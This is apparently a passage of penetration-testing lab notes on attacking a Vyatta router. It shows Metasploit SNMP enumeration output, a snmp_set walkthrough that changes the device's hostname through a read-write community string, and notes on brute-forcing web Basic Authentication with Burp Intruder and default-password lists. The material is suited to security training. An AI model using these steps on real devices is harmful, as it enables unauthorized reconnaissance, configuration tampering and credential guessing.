124                 libgdbm3-1.8.3-9
125                 libgeoip1-1.4.7~beta6+dfsg-1
126                 libglib2.0-0-2.24.2-1
127                 libgmp3c2-2:4.3.2+dfsg-1
128                 libgnutls26-2.8.6-1+squeeze2
129                 libgpg-error0-1.6-1
130                 libgssapi-krb5-2-1.8.3+dfsg-4squeeze6
131                 libheartbeat2-1:3.0.3-2
132                 libhtml-parser-perl-3.66-1
133                 libhtml-tagset-perl-3.20-2
134                 libhtml-tree-perl-3.23-2
135                 libidn11-1.15-2
136                 libio-prompt-perl-0.997001-1
137                 libio-socket-ssl-perl-1.33-1+squeeze1
138                 libisc62-1:9.7.3.dfsg-1~squeeze9
139                 libisccc60-1:9.7.3.dfsg-1~squeeze9
140                 libisccfg62-1:9.7.3.dfsg-1~squeeze9
141                 libk5crypto3-1.8.3+dfsg-4squeeze6
142                 libkeyutils1-1.4-1
143                 libklibc-1.5.20-1+squeeze1
144                 libkrb5-3-1.8.3+dfsg-4squeeze6
145                 libkrb5support0-1.8.3+dfsg-4squeeze6
146                 libldap-2.4-2-2.4.23-7.3
147                 liblocale-gettext-perl-1.05-6
148                 libltdl7-2.2.6b-2
149                 liblua5.1-0-5.1.4-5
150                 liblwres60-1:9.7.3.dfsg-1~squeeze9
151                 liblzma2-5.0.0-2
152                 liblzo2-2-2.03-2
153                 libmagic1-5.04-5+squeeze2
154                 libmnl0-1.0.3-5+daisy1
155                 libncurses5-5.7+20100313-5
156                 libncursesw5-5.7+20100313-5
157                 libnet-ssleay-perl-1.36-1
158                 libnet1-1.1.4-2
159                 libnetaddr-ip-perl-4.028+dfsg-1
160                 libnetfilter-conntrack3-1.0.0-1+vyatta16+daisy2
161                 libnetfilter-cthelper-1.0.1-4+daisy1
162                 libnetfilter-cttimeout-1.0.0-3+daisy1
163                 libnetfilter-queue1-0.0.17-6+daisy1
164                 libnfnetlink0-1.0.0-1
165                 libnl1-1.1-6
166                 libopenhpi2-2.14.1-1
167                 libopenipmi0-2.0.16-1.2
168                 libopts25-1:5.10-1.1
169                 libpam-modules-1.1.1-6.1+squeeze1
170                 libpam-radius-auth-1.3.16-4.4
171                 libpam-runtime-1.1.1-6.1+squeeze1
172                 libpam0g-1.1.1-6.1+squeeze1
173                 libparted0debian1-2.3-5
174                 libpcap0.8-1.1.1-2+squeeze1
175                 libpci3-1:3.1.7-6
176                 libpcre3-8.02-1.1
177                 libpcsclite1-1.5.5-4
178                 libperl5.10-5.10.1-17squeeze6
179                 libpkcs11-helper1-1.07-1
180                 libpopt0-1.16-1
181                 libradiusclient-ng2-0.5.6-1.1
182                 libreadline6-6.1-3
183                 libsablot0-1.0.3-1.1
184                 libsasl2-2-2.1.23.dfsg1-7
185                 libselinux1-2.0.96-1
186                 libsensors4-1:3.1.2-6
187                 libsepol1-2.0.41-1
188                 libsigc++-2.0-0c2a-2.2.4.2-1
189                 libslang2-2.2.2-4
190                 libsmi2ldbl-0.4.8+dfsg2-3
191                 libsnmp-base-5.7.2-vyatta+1+daisy3
192                 libsnmp-perl-5.7.2-vyatta+1+daisy3
193                 libsnmp15-5.7.2-vyatta+1+daisy3
194                 libsocket6-perl-0.23-1
195                 libsort-versions-perl-1.5-4
196                 libsqlite3-0-3.7.3-1
197                 libss2-1.41.12-4stable1
198                 libssh2-1-1.2.6-1
199                 libssl0.9.8-0.9.8o-4squeeze14
200                 libstdc++6-4.4.5-8
201                 libstrongswan-4.5.2-1.1-bpo60+5+daisy2
202                 libsysfs2-2.1.0+repack-1
203                 libtasn1-3-2.7-1+squeeze+1
204                 libterm-readkey-perl-2.30-4
205                 libterm-readline-perl-perl-1.0303-1
206                 libtext-charwidth-perl-0.04-6
207                 libtext-iconv-perl-1.7-2
208                 libtext-wrapi18n-perl-0.06-7
209                 libtimedate-perl-1.2000-1
210                 libtree-simple-perl-1.18-1
211                 libudev0-164-3
212                 liburi-perl-1.54-2
213                 libusb-0.1-4-2:0.1.12-16
214                 libuuid1-2.17.2-9
215                 libvyatta-cfg1-0.101.7+daisy2
216                 libvyatta-util1-0.13+daisy1
217                 libwant-perl-0.18-2
218                 libwrap0-7.6.q-19
219                 libwww-perl-5.836-1
220                 libxapian22-1.2.3-2
221                 libxml-libxml-perl-1.70.ds-1
222                 libxml-namespacesupport-perl-1.09-3
223                 libxml-sax-perl-0.96+dfsg-2
224                 libxml-simple-perl-2.18-3
225                 libxml2-2.7.8.dfsg-2+squeeze6
226                 libxml2-utils-2.7.8.dfsg-2+squeeze6
227                 lighttpd-1.4.28-2+squeeze1.3
228                 linux-firmware-1.29+daisy1
229                 linux-image-3.3.8-1-586-vyatta-3.3.8-1+vyatta+14+daisy4
230                 live-initramfs-1.157.1-1+vyatta+20+daisy1
231                 lldpd-0.6.0+vyatta+3+daisy2
232                 locales-2.11.3-4
233                 login-1:4.1.4.2+svn3283-2+squeeze1
234                 logrotate-3.7.8-6
235                 lsb-base-3.2-23.2squeeze1
236                 lsof-4.81.dfsg.1-1
237                 man-db-2.5.7-8
238                 mawk-1.3.3-15
239                 mdadm-3.1.4-1+8efb9d1+squeeze1
240                 mgetty-1.1.36-1.6
241                 mime-support-3.48-1
242                 module-init-tools-3.12-2+b1
243                 mount-2.17.2-9
244                 mtr-tiny-0.75-2
245                 nano-2.2.4-1
246                 ncurses-base-5.7+20100313-5
247                 ncurses-bin-5.7+20100313-5
248                 net-tools-1.60-23
249                 netbase-4.45
250                 netcat-traditional-1.10-38
251                 netplug-1.2.9.1-2-vyatta+3+daisy1
252                 nfct-1:1.0.1-2+vyatta35+daisy4
253                 ntp-1:4.2.6.p2+dfsg-1+vyatta+6+daisy2
254                 ntpdate-1:4.2.6.p2+dfsg-1+vyatta+6+daisy2
255                 openssh-blacklist-0.4.1
256                 openssh-client-1:5.5p1-6+squeeze3
257                 openssh-server-1:5.5p1-6+squeeze3
258                 openssl-0.9.8o-4squeeze14
259                 openssl-blacklist-0.5-2
260                 openvpn-2.1.3-2+squeeze1
261                 openvpn-blacklist-0.4
262                 parted-2.3-5
263                 passwd-1:4.1.4.2+svn3283-2+squeeze1
264                 patch-2.6-2
265                 pciutils-1:3.1.7-6
266                 perl-5.10.1-17squeeze6
267                 perl-base-5.10.1-17squeeze6
268                 perl-modules-5.10.1-17squeeze6
269                 pmacct-0.14.0+vyatta+1+daisy1
270                 ppp-2.4.5-4
271                 pppoe-3.8-3
272                 pptpd-1.3.4-3
273                 procps-1:3.2.8-9squeeze1
274                 psmisc-22.11-1
275                 python-2.6.6-3+squeeze7
276                 python-central-0.6.16+nmu1
277                 python-minimal-2.6.6-3+squeeze7
278                 python2.6-2.6.6-8+b1
279                 python2.6-minimal-2.6.6-8+b1
280                 radvd-1:1.6-1.1
281                 readline-common-6.1-3
282                 rsync-3.0.7-2
283                 rsyslog-4.6.4-2
284                 screen-4.0.3-14
285                 sed-4.2.1-7
286                 sensible-utils-0.0.4
287                 sipcalc-1.1.4-2
288                 snmp-5.7.2-vyatta+1+daisy3
289                 snmpd-5.7.2-vyatta+1+daisy3
290                 squid-langpack-20100628-1
291                 squid3-3.1.6-1.2+squeeze3
292                 squid3-common-3.1.6-1.2+squeeze3
293                 squidclient-3.1.6-1.2+squeeze3
294                 squidguard-1.4.0+vyatta+20+daisy1
295                 ssh-1:5.5p1-6+squeeze3
296                 ssmtp-2.64-4
297                 strongswan-4.5.2-1.1-bpo60+5+daisy2
298                 strongswan-ikev1-4.5.2-1.1-bpo60+5+daisy2
299                 strongswan-ikev2-4.5.2-1.1-bpo60+5+daisy2
300                 strongswan-starter-4.5.2-1.1-bpo60+5+daisy2
301                 sudo-1.7.4p4-2.squeeze.4
302                 sysv-rc-2.88dsf-13.1+squeeze1
303                 sysvinit-2.88dsf-13.1+squeeze1
304                 sysvinit-utils-2.88dsf-13.1+squeeze1
305                 tar-1.23-3
306                 tasksel-2.88
307                 tasksel-data-2.88
308                 tcl8.5-8.5.8-2
309                 tcpdump-4.1.1-1
310                 traceroute-1:2.0.15-1
311                 tshark-1.2.11-6+squeeze10
312                 tzdata-2012g-0squeeze1
313                 ucf-3.0025+nmu1
314                 udev-164-3
315                 usbutils-0.87-5squeeze1
316                 user-setup-1.38
317                 util-linux-2.17.2-9
318                 vim-common-2:7.2.445+hg~cb94c42c0e1a-1
319                 vim-tiny-2:7.2.445+hg~cb94c42c0e1a-1
320                 vlan-1.9-3
321                 vyatta-base-0.58+daisy1
322                 vyatta-bash-4.1-3-vyatta11+daisy1
323                 vyatta-biosdevname-1:0.3.11-vyatta6+daisy1
324                 vyatta-busybox-1.19.0-1+vyatta+6+daisy1
325                 vyatta-cfg-0.101.7+daisy2
326                 vyatta-cfg-dhcp-relay-0.10.24+daisy1
327                 vyatta-cfg-dhcp-server-0.12.36+daisy2
328                 vyatta-cfg-firewall-0.13.91+daisy6
329                 vyatta-cfg-op-pppoe-0.11.20+daisy2
330                 vyatta-cfg-qos-0.15.42+daisy1
331                 vyatta-cfg-quagga-0.18.161+daisy6
332                 vyatta-cfg-system-0.20.42+daisy18
333                 vyatta-cfg-vpn-0.12.105+daisy6
334                 vyatta-cluster-0.11.25+daisy1
335                 vyatta-config-mgmt-0.34+daisy1
336                 vyatta-config-migrate-0.13.65+daisy1
337                 vyatta-conntrack-0.54+daisy2
338                 vyatta-conntrack-sync-0.46+daisy2
339                 vyatta-dhcp3-client-4.1.2+vyatta9+daisy1
340                 vyatta-dhcp3-common-4.1.2+vyatta9+daisy1
341                 vyatta-dhcp3-relay-4.1.2+vyatta9+daisy1
342                 vyatta-dhcp3-server-4.1.2+vyatta9+daisy1
343                 vyatta-ipv6-rtradv-0.38+daisy1
344                 vyatta-keepalived-1.2.2-1-vyatta-13+daisy2
345                 vyatta-lldp-0.25+daisy2
346                 vyatta-nat-0.12.40+daisy2
347                 vyatta-netflow-0.42+daisy1
348                 vyatta-op-0.13.275+daisy5
349                 vyatta-op-dhcp-server-0.13.24+daisy1
350                 vyatta-op-firewall-0.10.4-39+daisy3
351                 vyatta-op-qos-0.12.27+daisy1
352                 vyatta-op-quagga-0.11.34+daisy1
353                 vyatta-op-vpn-0.13.83+daisy6
354                 vyatta-op-xml-0.11.10+daisy1
355                 vyatta-openvpn-0.2.60+daisy6
356                 vyatta-ppp-2.4.4rel-8-vyatta-27+pacifica3+daisy1
357                 vyatta-quagga-0.99.20.1-13+daisy2
358                 vyatta-ravpn-0.12.44+daisy1
359                 vyatta-util-0.13+daisy1
360                 vyatta-version-VC6.6R1
361                 vyatta-vrrp-0.11+daisy2
362                 vyatta-wanloadbalance-0.13.67+daisy1
363                 vyatta-webgui-0.2.13-101+daisy2
364                 vyatta-webproxy-0.2.110+daisy1
365                 vyatta-wireless-0.3.41+daisy2
366                 vyatta-wirelessmodem-0.1.24+daisy1
367                 vyatta-zone-0.15+daisy1
368                 whois-5.0.10
369                 wireshark-common-1.2.11-6+squeeze10
370                 wpasupplicant-0.6.10-2.1
371                 xkb-data-1.8-2
372                 xl2tpd-1.2.7+dfsg-1
373                 xz-utils-5.0.0-2
374                 zlib1g-1:1.2.3.4.dfsg-3

[*] Processes:

Id                  Status              Name                Path                Parameters
1                   runnable            init                init [2]
1615                runnable            udevd               udevd               --daemon
1775                runnable            udevd               udevd               --daemon
1776                runnable            udevd               udevd               --daemon
2292                runnable            atd                 /usr/sbin/atd
2300                runnable            acpid               /usr/sbin/acpid
2336                runnable            netplugd            /sbin/netplugd      -P -p /var/run/netplugd.pid
2343                runnable            cron                /usr/sbin/cron
2388                runnable            zebra               /usr/sbin/zebra     -d -P 0 -i /var/run/quagga/zebra.pid -S -s 1048576
2398                runnable            ripd                /usr/sbin/ripd      -d -P 0 -i /var/run/quagga/ripd.pid
2401                runnable            ripngd              /usr/sbin/ripngd    -d -P 0 -i /var/run/quagga/ripngd.pid
2407                runnable            ospfd               /usr/sbin/ospfd     -d -P 0 -i /var/run/quagga/ospfd.pid
2422                runnable            ospf6d              /usr/sbin/ospf6d    -d -P 0 -i /var/run/quagga/ospf6d.pid
2434                runnable            bgpd                /usr/sbin/bgpd      -d -P 0 -i /var/run/quagga/bgpd.pid -I
2628                runnable            rsyslogd            /usr/sbin/rsyslogd  -c4
2710                runnable            ntpd                /usr/sbin/ntpd      -p /var/run/ntpd.pid -g -u 102:107
2713                runnable            ntpd                /usr/sbin/ntpd      -p /var/run/ntpd.pid -g -u 102:107
2774                runnable            getty               /sbin/getty         38400 tty2
2775                runnable            getty               /sbin/getty         38400 tty3
2776                runnable            getty               /sbin/getty         38400 tty4
2777                runnable            getty               /sbin/getty         38400 tty5
2778                runnable            getty               /sbin/getty         38400 tty6
2779                runnable            getty               /sbin/getty         -L ttyS0 9600 vt100
2892                runnable            login               /bin/login          --
2893                runnable            vbash               -vbash
3069                runnable            newgrp              newgrp              vyattacfg
3071                runnable            vbash               vbash
3183                runnable            sshd                /usr/sbin/sshd      -p 22
3427                runnable            sshd                sshd: vyatta [priv]
3430                runnable            sshd                sshd: vyatta@pts/0
3431                runnable            vbash               -vbash
3768                runnable            busybox             /bin/busybox        telnetd -p 23
3815                runnable            lighttpd            /usr/sbin/lighttpd  -f /etc/lighttpd/lighttpd.conf
3823                runnable            chunker             /usr/sbin/chunker   -p /var/run/chunker.pid
3825                runnable            chunker             /usr/sbin/chunker   -p /var/run/chunker.pid
5107                running             snmpd               /usr/sbin/snmpd     -LSid -Lf /dev/null -u snmp -g snmp -p /var/run/snmpd.pid
5351                runnable            less                less                --buffers=64 --auto-buffers --no-lessopen --QUIT-AT-EOF --quit-if-one-screen --RAW-CONTROL-CHARS --squeeze-blank-lines --no-init


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_enum) >

Changing community string value
1.) Create a read-write community string in Vyatta
$ configure
# set service snmp community a1d3 authorization rw
# commit
# save

In MSF
msf > use auxiliary/scanner/snmp/snmp_set
msf auxiliary(snmp_set) > show options

Module options (auxiliary/scanner/snmp/snmp_set):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   OID                         yes       The object identifier (numeric notation)
   OIDVALUE                    yes       The value to set
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      161              yes       The target port
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>

msf auxiliary(snmp_set) > set COMMUNITY a1d3
COMMUNITY => a1d3
msf auxiliary(snmp_set) > set OID iso.3.6.1.2.1.1.5.0
OID => iso.3.6.1.2.1.1.5.0
msf auxiliary(snmp_set) > set OIDVALUE Demo
OIDVALUE => Demo
msf auxiliary(snmp_set) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(snmp_set) > run

[*] Try to connect to 192.168.1.101...
[-] 192.168.1.101 Error: ArgumentError ["iso", "3", "6", "1", "2", "1", "1", "5", "0"]:Array not a valid object ID ["/usr/share/metasploit-framework/lib/snmp/varbind.rb:161:in `rescue in initialize'", "/usr/share/metasploit-framework/lib/snmp/varbind.rb:153:in `initialize'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:243:in `new'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:243:in `parse_oid'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:218:in `oid'", "/usr/share/metasploit-framework/lib/snmp/mib.rb:167:in `varbind_list'", "/usr/share/metasploit-framework/lib/snmp/manager.rb:239:in `get'", "/usr/share/metasploit-framework/lib/snmp/manager.rb:262:in `get_value'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/snmp/snmp_set.rb:51:in `run_host'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:134:in `block (2 levels) in run'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'"]
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_set) > set OID 1.3.6.1.2.1.1.5.0
OID => 1.3.6.1.2.1.1.5.0
msf auxiliary(snmp_set) > run

[*] Try to connect to 192.168.1.101...
[*] Check initial value : OID 1.3.6.1.2.1.1.5.0 => vyatta
[*] Set new value : OID 1.3.6.1.2.1.1.5.0 => Demo
[*] Check new value : OID 1.3.6.1.2.1.1.5.0 => Demo
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_set) >
msf auxiliary(snmp_set) > set OIDVALUE vyatta
OIDVALUE => vyatta
msf auxiliary(snmp_set) > run

[*] Try to connect to 192.168.1.101...
[*] Check initial value : OID 1.3.6.1.2.1.1.5.0 => Demo
[*] Set new value : OID 1.3.6.1.2.1.1.5.0 => vyatta
[*] Check new value : OID 1.3.6.1.2.1.1.5.0 => vyatta
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_set) >

Get the oid from SNMP walk
OID has to be converted into metasploit format
$ snmptranslate -On iso.3.6.1.2.1.1.5.0
.1.3.6.1.2.1.1.5.0



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Attacking web interfaces

Default Passwords
http://www.routerpasswords.com/

Burpsuite
Intruder -> Positions -> Add -> Payload Type -> Payload Processing -> Start Attack
<See image>
Basic_Authentication_1.jpeg
Basic_Authentication_2.jpeg
Check status for non 401
Decode the output as Base64

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
